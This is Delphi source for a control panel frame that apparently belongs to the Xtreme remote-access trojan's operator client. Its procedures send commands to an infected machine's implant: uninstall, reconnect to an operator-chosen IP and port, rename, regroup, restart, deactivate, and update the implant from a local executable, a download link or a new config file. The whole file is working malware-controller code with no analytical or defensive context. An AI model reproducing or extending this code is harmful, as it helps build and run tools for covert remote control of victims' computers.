unit UnitFrameAllServer;

interface

uses
  StrUtils,Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, UnitMain, StdCtrls, sCheckBox, sLabel, ExtCtrls, VirtualTrees,
  sFrameAdapter, sGroupBox, Buttons, UnitConexao;

type
  TFrameAllServer = class(TFrame)
    sWebLabel1: TsWebLabel;
    sWebLabel2: TsWebLabel;
    sWebLabel3: TsWebLabel;
    sWebLabel4: TsWebLabel;
    sWebLabel5: TsWebLabel;
    sWebLabel6: TsWebLabel;
    sWebLabel7: TsWebLabel;
    sFrameAdapter1: TsFrameAdapter;
    RadioGroup1: TsRadioGroup;
    OpenDialog1: TOpenDialog;
    sSpeedButton1: TSpeedButton;
    sSpeedButton2: TSpeedButton;
    sSpeedButton3: TSpeedButton;
    sSpeedButton4: TSpeedButton;
    sSpeedButton5: TSpeedButton;
    sSpeedButton6: TSpeedButton;
    sSpeedButton7: TSpeedButton;
    procedure sWebLabel1Click(Sender: TObject);
  private
    { Private declarations }
    Servidor: TConexaoNew;
    procedure Desinstalar;
    procedure Reconectar;
    procedure MudarDeGrupo;
    procedure Renomear;
    procedure Reiniciar;
    procedure Desativar;
    procedure UpLocalFile;
    procedure UpLink;
    procedure UpConfig;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

implementation

{$R *.dfm}

uses
  UnitAll,
  UnitStrings,
  UnitConstantes,
  UnitCommonProcedures;

constructor TFrameAllServer.Create(aOwner: TComponent; ConAux: TConexaoNew);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  RadioGroup1.Font.Color := clTeal;
end;

function LerArquivo(FileName: pWideChar; var p: pointer): Int64;
var
  hFile: Cardinal;
  lpNumberOfBytesRead: DWORD;
begin
  result := 0;
  p := nil;
  if fileexists(filename) = false then exit;

  hFile := CreateFile(FileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  result := windows.GetFileSize(hFile, nil);
  GetMem(p, result);
  ReadFile(hFile, p^, result, lpNumberOfBytesRead, nil);
  CloseHandle(hFile);
end;

procedure TFrameAllServer.UpConfig;
var
  ConfigFile: WideString;
  TempStr, Tosend: WideString;
  p: pointer;
  Size: int64;
  i: integer;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := 'ServerConfig.cfg';
  OpenDialog1.Filter := 'Xtreme Server Config(*.cfg)|*.cfg';
  if OpenDialog1.Execute = false then exit;

  ConfigFile := OpenDialog1.FileName;
  Size := LerArquivo(pWideChar(ConfigFile), p);

  SetLength(TempStr, Size div 2);
  CopyMemory(@TempStr[1], p, Size);

  if MessageBox(Handle,
                pchar(Traduzidos[576]),
                pchar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
  ToSend := CHANGESERVERSETTINGS + '|' + 'Y' + '|' +TempStr else
  ToSend := CHANGESERVERSETTINGS + '|' + 'N' + '|' + TempStr;

  Servidor.EnviarString(ToSend);
end;

procedure TFrameAllServer.UpLink;
var
  i: integer;
  Name: string;
begin
  application.ProcessMessages;
  name := FormMain.LastUpdateLink;
  if inputquery(pwidechar(traduzidos[175]), pwidechar(traduzidos[174]), name) = false then exit;
  FormMain.LastUpdateLink := Name;

  Servidor.EnviarString(UPDATESERVERLINK + '|' + FormMain.LastUpdateLink);
end;

procedure TFrameAllServer.UpLocalFile;
var
  FileSize: int64;
  i: integer;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := 'Server.exe';
  OpenDialog1.Filter := 'Executables(*.exe)|*.exe';

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin
    FileSize := GetFileSize(OpenDialog1.FileName);
    if FileSize = 0 then exit;
    Servidor.EnviarString(UPDATESERVERLOCAL + DelimitadorComandos + OpenDialog1.FileName);
  end;
end;

procedure TFrameAllServer.Desativar;
begin
  if MessageBox(Handle,
                pwidechar(Traduzidos[563] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  Servidor.EnviarString(UnitConstantes.DESATIVAR + DelimitadorComandos);
end;

procedure TFrameAllServer.Reiniciar;
begin
  Servidor.EnviarString(UnitConstantes.RESTARTSERVER + DelimitadorComandos);
end;

procedure TFrameAllServer.Renomear;
var
  i: integer;
  Name: string;
begin
  application.ProcessMessages;
  name := FormMain.LastRenameName;
  if inputquery(pwidechar(traduzidos[169]), pwidechar(traduzidos[171]), name) = false then exit;
  if CheckValidName(Name) = False then Exit;

  FormMain.LastRenameName := Name;

  Servidor.EnviarString(UnitConstantes.RENOMEAR + DelimitadorComandos + Name);
end;

procedure TFrameAllServer.MudarDeGrupo;
var
  i: integer;
  Name: string;
begin
  application.ProcessMessages;
  name := FormMain.LastGroupName;
  if inputquery(pwidechar(traduzidos[168]), pwidechar(traduzidos[170]), name) = false then exit;
  if CheckValidName(Name) = False then Exit;
  FormMain.LastGroupName := Name;

  Servidor.EnviarString(CHANGEGROUP + DelimitadorComandos + Name);
end;

procedure TFrameAllServer.Desinstalar;
begin
  if MessageBox(Handle,
                pwidechar(Traduzidos[136] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;
  Servidor.EnviarString(UnitConstantes.DESINSTALAR + DelimitadorComandos);
end;

procedure TFrameAllServer.Reconectar;
var
  i, j, xPorta: integer;
  Name, xIP: string;
begin
  application.ProcessMessages;

  name := FormMain.LastReconnectIP;

  if inputquery(pwidechar(traduzidos[163]), pwidechar(traduzidos[164]) + #13#10 + '(Ex.: 127.0.0.1:81)', name) then
  begin
    xIP := copy(name, 1, posex(':', name) - 1);
    delete(name, 1, posex(':', name));
    try
      xPorta := strtoint(name);
      except
      MessageDlg(pchar(traduzidos[104]), mtWarning, [mbOK], 0);
      exit;
    end;

    if (xporta < 1) or (xporta > 65535) then
    begin
      MessageDlg(pchar(traduzidos[104]), mtWarning, [mbOK], 0);
      exit;
    end;
  end else exit;

  FormMain.LastReconnectIP := xIP + ':' + inttostr(xporta);

  Servidor.EnviarString(UnitConstantes.RECONECTAR + DelimitadorComandos + FormMain.LastReconnectIP);
end;

procedure TFrameAllServer.sWebLabel1Click(Sender: TObject);
var
  i: integer;
begin
  i := -1;
  if (Sender is TsWebLabel) then i := (Sender as TsWebLabel).Tag else
  if (Sender is TSpeedButton) then i := (Sender as TSpeedButton).Tag;

  case i of
    0:
      Desinstalar;
    1:
      Reconectar;
    2:
      MudarDeGrupo;
    3:
      Renomear;
    4:
      Reiniciar;
    5:
      Desativar;
    6:
      if RadioGroup1.ItemIndex = 0 then UpLocalFile else
      if RadioGroup1.ItemIndex = 1 then UpLink else
      if RadioGroup1.ItemIndex = 2 then UpConfig;
  end;
end;

end.
